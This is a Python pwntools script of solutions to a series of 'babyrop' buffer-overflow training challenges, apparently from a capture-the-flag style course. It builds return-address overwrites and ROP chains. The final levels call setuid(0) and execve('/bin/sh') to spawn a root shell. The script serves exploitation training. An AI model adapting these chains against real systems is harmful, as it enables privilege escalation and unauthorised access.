#!/usr/bin/python

from pwn import *


def baby1_0(p):
    win_addr = 0x00401fca

    #data = cyclic(200) Find crash index cyclic_find(0x6261616f6261616e) = 152
    data = b'A'*152 + p64(win_addr)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby1_1(p):
    win_addr = 0x4017c7

    #data = cyclic(200) # Find crash index cyclic_find(0x6161616c6161616b) = 40
    data = b'A'*40 + p64(win_addr)

    p.recvuntil(b'###')
    p.sendline(data)

def baby2_0(p):
    ''''''
    win1 = 0x401bc8
    win2 = 0x401c75

    #data = cyclic(200) # Find crash index cyclic_find(0x6261616762616166) = 120
    data = b'A'*120 + p64(win1) + p64(win2)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby2_1(p):
    ''''''
    win1 = 0x40126d
    win2 = 0x40131a

    #data = cyclic(200) # Find crash index cyclic_find(0x6261616762616166) = 120
    data = b'A'*120 + p64(win1) + p64(win2)

    p.recvuntil(b'###')
    p.sendline(data)

def baby3_0(p):
    ''''''
    win1 = 0x4023d9
    win2 = 0x402760
    win3 = 0x402598
    win4 = 0x40267a
    win5 = 0x4024b5

    pop_rdi = 0x402b53

    data = b'A'*104 + \
           p64(pop_rdi) + p64(1) + p64(win1) + \
           p64(pop_rdi) + p64(2) + p64(win2) + \
           p64(pop_rdi) + p64(3) + p64(win3) + \
           p64(pop_rdi) + p64(4) + p64(win4) + \
           p64(pop_rdi) + p64(5) + p64(win5)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby3_1(p):
    ''''''
    win1 = 0x40203d
    win2 = 0x401cb2
    win3 = 0x401e78
    win4 = 0x401d92
    win5 = 0x401f5a

    pop_rdi = 0x402273
    data = b'A'*56 + \
           p64(pop_rdi) + p64(1) + p64(win1) + \
           p64(pop_rdi) + p64(2) + p64(win2) + \
           p64(pop_rdi) + p64(3) + p64(win3) + \
           p64(pop_rdi) + p64(4) + p64(win4) + \
           p64(pop_rdi) + p64(5) + p64(win5)

    p.recvuntil(b'###')
    p.sendline(data)

def baby4_0(p):
    ''''''
    execve = 0x3b
    setuid = 0x69
    syscall = 0x401fb5
    pop_rdi = 0x401fd5
    pop_rax = 0x401fad
    pop_rsi = 0x401fcd
    pop_rdx = 0x401fa5

    
    p.recvuntil(b'[LEAK]')
    leak = int(p.recvline().split(b':')[1].strip()[:-1], 16)

    # set uid to root then run shell
    data = b'/bin/sh\0' + b'A'*80 + \
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rax) + p64(execve) + \
           p64(pop_rdi) + p64(leak) + \
           p64(pop_rsi) + p64(0) + \
           p64(pop_rdx) + p64(0) + \
           p64(syscall)


    p.sendline(data)

def baby4_1(p):
    ''''''
    execve = 0x3b
    setuid = 0x69
    syscall = 0x401690
    pop_rdi = 0x401688
    pop_rax = 0x401699
    pop_rsi = 0x4016a0
    pop_rdx = 0x4016b1

    p.recvuntil(b'[LEAK]')
    leak = int(p.recvline().split(b':')[1].strip()[:-1], 16)

    data = b'/bin/sh\0' + b'A'*48 + \
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rax) + p64(execve) + \
           p64(pop_rdi) + p64(leak) + \
           p64(pop_rsi) + p64(0) + \
           p64(pop_rdx) + p64(0) + \
           p64(syscall)

    p.sendline(data)

p = process('/challenge/babyrop_level4.1')
#p = gdb.debug('./babyrop_level4.1','''
#c            
#''')


baby4_1(p)
p.interactive()